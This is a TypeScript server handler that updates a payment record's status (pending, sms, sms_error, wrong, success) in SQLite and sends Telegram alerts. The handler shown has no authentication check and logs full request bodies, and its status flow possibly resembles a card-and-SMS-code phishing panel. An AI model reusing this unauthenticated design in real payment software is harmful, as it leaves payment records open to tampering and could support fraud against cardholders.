import db, { type PaymentInfo } from '~/server/database/db';
import { sendStatusUpdateNotification } from '~/server/utils/telegram';

export default defineEventHandler(async (event) => {
    const method = event.method;
    const paymentId = getRouterParam(event, 'id');

    console.log(`🔍 DEBUG: Status update request - Method: ${method}, Payment ID: ${paymentId}`);

    if (!paymentId) {
        console.error('❌ DEBUG: Payment ID is missing');
        throw createError({
            statusCode: 400,
            statusMessage: 'Payment ID is required'
        });
    }

    // Validate payment ID is a number
    const numericPaymentId = parseInt(paymentId);
    if (isNaN(numericPaymentId)) {
        console.error('❌ DEBUG: Invalid payment ID format:', paymentId);
        throw createError({
            statusCode: 400,
            statusMessage: 'Payment ID must be a valid number'
        });
    }

    if (method === 'PUT') {
        try {
            console.log(`📝 DEBUG: Reading request body for payment ${paymentId}`);
            const body = await readBody(event);
            console.log(`📋 DEBUG: Request body:`, body);

            const { status } = body;

            if (!status) {
                console.error('❌ DEBUG: Status is missing in request body');
                throw createError({
                    statusCode: 400,
                    statusMessage: 'Status is required'
                });
            }

            // Map frontend status values to database values
            const statusMapping: Record<string, string> = {
                pending: 'pending',
                sms: 'sms',
                sms_error: 'sms_error',
                wrong: 'wrong',
                success: 'success'
            };

            const mappedStatus = statusMapping[status] || status;
            const validStatuses = Object.values(statusMapping);

            if (!validStatuses.includes(mappedStatus)) {
                console.error('❌ DEBUG: Invalid status:', status, 'Valid statuses:', validStatuses);
                throw createError({
                    statusCode: 400,
                    statusMessage: `Invalid status. Must be one of: ${validStatuses.join(', ')}`
                });
            }

            console.log(`🔍 DEBUG: Checking if payment ${paymentId} exists`);

            // Check if payment exists
            let existingPayment: { id: number; status: string } | undefined;
            try {
                const checkStmt = db.prepare('SELECT id, status FROM payment_info WHERE id = ?');
                existingPayment = checkStmt.get(numericPaymentId) as { id: number; status: string };
            } catch (dbError) {
                console.error(`❌ DEBUG: Database error checking payment ${paymentId}:`, dbError);
                throw createError({
                    statusCode: 500,
                    statusMessage: 'Database error while checking payment'
                });
            }

            if (!existingPayment) {
                console.error(`❌ DEBUG: Payment ${paymentId} not found in database`);
                throw createError({
                    statusCode: 404,
                    statusMessage: 'Payment not found'
                });
            }

            console.log(`✅ DEBUG: Payment ${paymentId} exists, current status: ${existingPayment.status}, new status: ${mappedStatus}`);

            // Update payment status - với xử lý lỗi cột updated_at
            let updateResult;
            try {
                // Kiểm tra xem cột updated_at có tồn tại không
                const tableInfo = db.prepare('PRAGMA table_info(payment_info)').all() as Array<{ name: string; type: string }>;
                const hasUpdatedAt = tableInfo.some((column) => column.name === 'updated_at');

                if (hasUpdatedAt) {
                    // Cột updated_at tồn tại, sử dụng query bình thường
                    const updateStmt = db.prepare('UPDATE payment_info SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?');
                    updateResult = updateStmt.run(mappedStatus, numericPaymentId);
                } else {
                    // Cột updated_at không tồn tại, chỉ update status
                    console.log('⚠️ DEBUG: updated_at column not found, updating status only');
                    const updateStmt = db.prepare('UPDATE payment_info SET status = ? WHERE id = ?');
                    updateResult = updateStmt.run(mappedStatus, numericPaymentId);
                }

                console.log(`🔄 DEBUG: Update completed for payment ${paymentId}, rows affected: ${updateResult.changes}`);
            } catch (dbError: any) {
                console.error(`❌ DEBUG: Database error updating payment ${paymentId}:`, dbError);

                // Nếu lỗi là do cột updated_at không tồn tại, thử update không có cột đó
                if (dbError.message && dbError.message.includes('updated_at')) {
                    console.log('🔄 DEBUG: Retrying update without updated_at column');
                    try {
                        const updateStmt = db.prepare('UPDATE payment_info SET status = ? WHERE id = ?');
                        updateResult = updateStmt.run(mappedStatus, numericPaymentId);
                        console.log(`✅ DEBUG: Update successful without updated_at, rows affected: ${updateResult.changes}`);
                    } catch (retryError: any) {
                        console.error(`❌ DEBUG: Retry update failed:`, retryError);
                        throw createError({
                            statusCode: 500,
                            statusMessage: `Database error: ${retryError.message || 'Unknown database error'}`
                        });
                    }
                } else {
                    throw createError({
                        statusCode: 500,
                        statusMessage: `Database error: ${dbError.message || 'Unknown database error'}`
                    });
                }
            }

            if (updateResult.changes === 0) {
                console.error(`❌ DEBUG: No rows updated for payment ${paymentId}`);
                throw createError({
                    statusCode: 404,
                    statusMessage: 'Payment not found or no changes made'
                });
            }

            console.log(`✅ DEBUG: Successfully updated payment ${paymentId}`);

            // Get updated payment data
            let updatedPayment;
            try {
                const updatedPaymentStmt = db.prepare('SELECT * FROM payment_info WHERE id = ?');
                updatedPayment = updatedPaymentStmt.get(numericPaymentId) as PaymentInfo;
            } catch (dbError) {
                console.error(`❌ DEBUG: Database error getting updated payment data for ${paymentId}:`, dbError);
                throw createError({
                    statusCode: 500,
                    statusMessage: 'Database error while retrieving updated payment data'
                });
            }

            if (!updatedPayment) {
                console.error(`❌ DEBUG: Failed to get updated payment data for ${paymentId}`);
                throw createError({
                    statusCode: 500,
                    statusMessage: 'Failed to retrieve updated payment data'
                });
            }

            console.log(`✅ DEBUG: Successfully retrieved updated payment data:`, {
                id: updatedPayment.id,
                status: updatedPayment.status,
                updated_at: updatedPayment.updated_at
            });

            // Send Telegram notification if status changed
            if (existingPayment.status !== mappedStatus) {
                console.log(`📱 DEBUG: Status changed for payment ${paymentId}: ${existingPayment.status} -> ${mappedStatus}`);

                // Send notification in background
                sendStatusUpdateNotification(updatedPayment)
                    .then((success) => {
                        if (success) {
                            console.log(`✅ DEBUG: Telegram notification sent successfully for payment ${paymentId}`);
                        } else {
                            console.log(`⚠️ DEBUG: Failed to send Telegram notification for payment ${paymentId}`);
                        }
                    })
                    .catch((error) => {
                        console.error(`🚨 DEBUG: Error sending Telegram notification for payment ${paymentId}:`, error);
                    });
            } else {
                console.log(`ℹ️ DEBUG: Status unchanged for payment ${paymentId}, skipping Telegram notification`);
            }

            // Return success response
            console.log(`✅ DEBUG: Status update completed successfully for payment ${paymentId}`);
            return {
                success: true,
                message: 'Payment status updated successfully',
                data: updatedPayment
            };
        } catch (error: any) {
            console.error(`🚨 DEBUG: Error updating payment status for ${paymentId}:`, error);

            // If it's already a createError, re-throw it
            if (error.statusCode) {
                throw error;
            }

            // Log the full error for debugging
            console.error(`🚨 DEBUG: Full error details:`, {
                message: error.message,
                stack: error.stack,
                name: error.name
            });

            // Otherwise, create a generic error
            throw createError({
                statusCode: 500,
                statusMessage: 'Internal Server Error - Failed to update payment status'
            });
        }
    }

    console.error(`❌ DEBUG: Method ${method} not allowed`);
    throw createError({
        statusCode: 405,
        statusMessage: 'Method not allowed'
    });
});
